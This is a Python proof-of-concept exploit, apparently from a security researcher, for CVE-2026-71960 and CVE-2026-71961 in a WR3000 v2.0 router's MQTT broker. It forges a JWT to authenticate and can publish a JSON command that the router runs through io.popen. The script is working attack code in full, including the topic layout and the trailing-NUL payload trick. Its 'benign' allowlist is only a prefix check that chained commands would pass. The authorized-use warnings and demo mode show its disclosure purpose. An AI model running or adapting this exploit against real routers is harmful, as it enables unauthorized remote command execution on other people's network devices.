#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 ShibbityShwab
"""
mqtt_command_poc.py - authenticate to a WR3000 v2.0 Mosquitto broker with a forged JWT
(CVE-2026-71960) and exercise the mesh command interface (CVE-2026-71961).

AUTHORIZED RESEARCH ONLY. Run this only against hardware you own or have explicit written
permission to test. See ../writeups/verify-on-your-own-device.md.

Default behaviour is passive: CONNECT, subscribe to the role's ACL read pattern, print
traffic, exit. A command is published only when --cmd is passed, and only if the command
is on the benign allowlist below.

The verified single-node command chain uses the satellite role. A forged "cudydevice" JWT
can write router/000000000000/+/+/+/+; the admin's own subscription reads it; command.lua
trusts src_did=000000000000 and runs the JSON "cmd" through io.popen. The payload needs a
trailing NUL for the C-side JSON sniff (payload[payloadlen-2] == '}').

Usage:
    python3 mqtt_command_poc.py --demo
    python3 mqtt_command_poc.py --host <your router> --secret '<your unit secret>' --listen 20
    python3 mqtt_command_poc.py --host <your router> --secret '<your unit secret>' \
        --cmd 'id > /tmp/mqtt-poc.txt'

Requires: paho-mqtt  (pip install paho-mqtt), pyjwt
"""
import argparse
import json
import sys
import time

from forge_jwt import forge

TOPIC_SATELLITE_READ = "router/+/000000000000/+/+/+"
TOPIC_ADMIN_READ = "router/000000000000/+/+/+/+"
CMD_TOPIC_FMT = "router/{controller}/{satellite}/{seq}/router/command"
ROLES = {"satellite": "cudydevice", "admin": "admincudydevice"}
BENIGN_PREFIXES = ("id", "uname", "echo", "hostname", "true")
DEMO_SECRET = "PLACEHOLDER-SECRET-FOR-DEMO"


def on_connect(client, userdata, flags, rc, props=None):
    if rc == 0:
        print("[+] CONNACK rc=0 - broker accepted the forged JWT")
        client.subscribe(userdata["subscribe"])
        print(f"[+] subscribe requested: {userdata['subscribe']} (ACL file applies)")
    else:
        print(f"[!] CONNACK rc={rc} - rejected")
        userdata["failed"] = True


def on_subscribe(client, userdata, mid, granted_qos, props=None):
    print(f"[+] SUBACK mid={mid} granted={granted_qos}")
    if 0x80 in granted_qos:
        print("[!] subscription denied by the ACL")


def on_message(client, userdata, msg):
    body = msg.payload.decode(errors="replace")
    print(f"[msg] {msg.topic}: {body[:400]}")
    if '"data"' in body and "uid=" in body:
        print("[+] command output received - CVE-2026-71961 chain complete")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--demo", action="store_true",
                    help="print the connection and payload shape; no network")
    ap.add_argument("--host", help="your router's LAN IP (required unless --demo)")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--deviceid", default="cudydevice",
                    help="bdinfo deviceid the plugin checks for (default cudydevice)")
    ap.add_argument("--role", choices=tuple(ROLES), default="satellite",
                    help="ACL role; sets the exact MQTT username")
    ap.add_argument("--secret", help="your own unit's bdinfo secret")
    ap.add_argument("--seq", type=int, default=7, help="topic sequence number (default 7)")
    ap.add_argument("--cmd", default=None,
                    help="benign command string for command.lua (CVE-2026-71961). "
                         "Adds the trailing NUL. Use ONLY on hardware you own.")
    ap.add_argument("--listen", type=int, default=20, help="seconds to listen")
    args = ap.parse_args()

    username = ROLES[args.role]
    if args.deviceid not in username:
        sys.exit(f"[!] username {username!r} does not contain the bdinfo deviceid {args.deviceid!r}")

    if args.demo:
        token = forge(args.deviceid, DEMO_SECRET, username=username)
        topic = CMD_TOPIC_FMT.format(controller="000000000000", satellite="000000000000",
                                     seq=args.seq)
        print("[*] demo mode: no network, no device contact")
        print(f"[*] CONNECT 192.0.2.10:{args.port} user={username} role={args.role}")
        print(f"[*] password: {token}")
        print(f"[*] subscribe: {TOPIC_SATELLITE_READ if args.role == 'satellite' else TOPIC_ADMIN_READ}")
        print(f"[*] command topic: {topic}")
        print('[*] payload: {"cmd":"id > /tmp/mqtt-poc.txt","reply":1}\\x00  (trailing NUL)')
        print("[*] run against your own router with --host and --secret")
        return

    if not args.host:
        sys.exit("[!] --host is required (or use --demo); use your own router only")
    if not args.secret:
        sys.exit("[!] --secret is required (your own unit's bdinfo secret, or use --demo)")
    if args.cmd and not args.cmd.startswith(BENIGN_PREFIXES):
        sys.exit("[!] refusing to publish a non-benign command; edit the allowlist in your own "
                 "copy only if you truly own the target")

    import paho.mqtt.client as mqtt
    token = forge(args.deviceid, args.secret, username=username)
    print(f"[*] CONNECT {args.host}:{args.port} user={username} role={args.role}")

    userdata = {
        "subscribe": (TOPIC_SATELLITE_READ if args.role == "satellite" else TOPIC_ADMIN_READ),
        "failed": False,
    }
    c = mqtt.Client(client_id="wr3000v2-cve-poc", protocol=mqtt.MQTTv311)
    c.username_pw_set(username, token)
    c.on_connect = on_connect
    c.on_subscribe = on_subscribe
    c.on_message = on_message
    c.user_data_set(userdata)
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(2)

    if userdata["failed"]:
        c.loop_stop()
        sys.exit(1)

    if args.cmd:
        payload = json.dumps({"cmd": args.cmd, "reply": 1}).encode() + b"\x00"
        topic = CMD_TOPIC_FMT.format(controller="000000000000", satellite="000000000000",
                                     seq=args.seq)
        print(f"[*] publishing (CVE-2026-71961): {topic} {payload!r}")
        c.publish(topic, payload)

    print(f"[*] listening {args.listen}s ...")
    time.sleep(args.listen)
    c.loop_stop()
    print("[*] done")


if __name__ == "__main__":
    main()
